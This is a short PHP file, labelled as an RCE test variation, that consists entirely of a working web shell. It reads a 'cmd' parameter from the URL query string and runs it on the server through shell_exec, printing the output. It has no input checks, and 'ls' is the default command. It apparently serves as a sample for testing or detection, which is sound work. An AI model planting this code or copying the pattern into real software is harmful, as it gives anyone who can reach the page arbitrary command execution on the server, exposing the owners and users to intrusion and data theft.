<?php
// RCE test variation #625
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>